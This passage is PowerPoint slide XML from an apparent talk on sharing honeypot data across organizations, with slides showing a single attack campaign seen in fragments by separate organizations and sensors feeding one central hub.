        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BACKGROUND</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each honeypot sees only one slice</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="campaign circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2331720"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="attack campaign icon" descr="attack campaign">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="2560320"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="campaign caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="3337560"/>
            <a:ext cx="1371600" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One campaign</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="org A circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1463040"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="org A letter"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1463040"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="org A caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="1664208"/>
            <a:ext cx="731520" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Org A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="campaign arrow A"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1600200" y="1828800"/>
            <a:ext cx="1645920" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="org B circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="2423160"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="org B letter"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="2423160"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="org B caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="2624328"/>
            <a:ext cx="731520" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Org B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="campaign arrow B"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="2788920"/>
            <a:ext cx="1645920" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="org C circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3383280"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="org C letter"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3383280"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="org C caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="3584448"/>
            <a:ext cx="731520" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Org C</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="campaign arrow C"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="2788920"/>
            <a:ext cx="1645920" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="slice point 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="1417320"/>
            <a:ext cx="3474720" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Attacks hit many targets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Botnets, mass scanners and reused exploit kits reach everyone they can.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="slice rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="2377440"/>
            <a:ext cx="3474720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="slice point 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="2468880"/>
            <a:ext cx="3474720" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Views are split</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each organization sees its own piece, and nothing more.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="slice rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="3429000"/>
            <a:ext cx="3474720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="slice point 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="3520440"/>
            <a:ext cx="3474720" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The picture needs sharing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Only by combining views can you tell it is one coordinated attack.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>THE PROBLEM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Today's fix: send everything to one hub</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="sensor 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1463040"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="sensor 1 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1463040"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="sensor arrow 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1783080"/>
            <a:ext cx="685800" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="sensor 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="2377440"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="sensor 2 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="2377440"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="sensor arrow 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="2697480"/>
            <a:ext cx="685800" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="sensor 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="3291840"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="sensor 3 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="3291840"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="sensor arrow 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1280160" y="2697480"/>
            <a:ext cx="685800" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="hub box"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="2194560"/>
            <a:ext cx="2103120" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7273"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="hub label"/>
          <p:cNvSpPr txBox="1"/>
